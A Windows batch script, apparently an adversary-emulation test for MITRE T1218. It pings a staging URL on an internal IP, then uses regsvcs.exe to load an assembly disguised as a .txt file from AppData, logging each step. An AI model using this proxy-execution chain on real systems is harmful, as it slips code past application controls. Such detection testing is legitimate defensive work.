@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\9470\ac94863b
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9470-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=exploren.txt
SET ewjmdkff=9470
SET xbcey=%APPDATA%\!pudaazx!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_start>> "!xbcey!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_complete>> "!xbcey!" 2>nul

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: chdir_start=!pjkcpgw!>> "!xbcey!" 2>nul
cd /d "!pjkcpgw!"
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: chdir_complete>> "!xbcey!" 2>nul

SET wqsf=1
SET qfrkm=
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe "!syjfr!"
IF NOT !ERRORLEVEL! EQU 0 (
    SET wqsf=0
    SET qfrkm=assembly_load_failed
)
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: process_start=regsvcs.exe>> "!xbcey!" 2>nul
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: dll_load=!syjfr!>> "!xbcey!" 2>nul

echo [!DATE!-!TIME:.=!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|Regsvcs=!wqsf!:!qfrkm!>> "!xbcey!" 2>nul
ENDLOCAL